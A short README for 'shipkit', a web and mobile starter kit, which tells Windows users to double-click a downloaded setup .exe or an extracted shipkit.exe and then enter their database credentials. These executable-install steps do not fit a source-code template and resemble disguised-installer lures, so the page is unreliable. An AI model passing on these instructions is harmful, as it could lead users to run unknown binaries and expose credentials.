## 🌐 What is shipkit?

shipkit combines several modern technologies to create a full-stack starter kit:

- **Next.js 15:** For fast and SEO-friendly websites
- **Expo 54:** To build cross-platform mobile apps easily
- **Better Auth:** Simple, secure user authentication
- **Mastra AI:** Built-in AI features for smarter interactions
- **Neon Postgres:** A hosted, fast database solution
- **Tailwind CSS v4:** Stylish, utility-first design framework

You get a ready-to-use setup that works for both web and mobile, saving time and hassle.

## 📥 Install and Run shipkit on Windows

After you have downloaded the installer or zipped file, here is how to install and open the app:

### If you downloaded an installer (`.exe` file):

1. Find the `shipkit-win-setup.exe` file in your Downloads or Desktop folder.

2. Double-click the file to start the installation.

3. Follow the on-screen instructions:

   - Accept the license agreement
   - Choose the installation folder (the default is usually fine)
   - Click "Install"

4. When the installation finishes, click "Finish" to close the installer.

5. Look for the shipkit app icon on your Desktop or Start Menu.

6. Double-click the icon to open the app.

### If you downloaded a zipped package (`.zip` file):

1. Locate the `shipkit.zip` file in your Downloads or Desktop folder.

2. Right-click the file and select "Extract All".

3. Choose a folder to extract the contents into, such as a new folder on your Desktop.

4. Open the extracted folder and find the `shipkit.exe` file.

5. Double-click `shipkit.exe` to run the app.

## ⚙️ Setup After Installation

When you first open shipkit, follow these steps to get started:

1. **Create an account or log in:** Use the built-in Better Auth system to register or sign in.

2. **Connect to Neon Postgres:** Enter your database connection details. You can register for a free Neon Postgres account if you do not have one yet.

3. **Explore templates:** Use the built-in templates for web or mobile apps. You can customize the designs or features as needed.

4. **Try AI features:** Mastra AI powers smart functionalities. Test AI features in your app without setup.
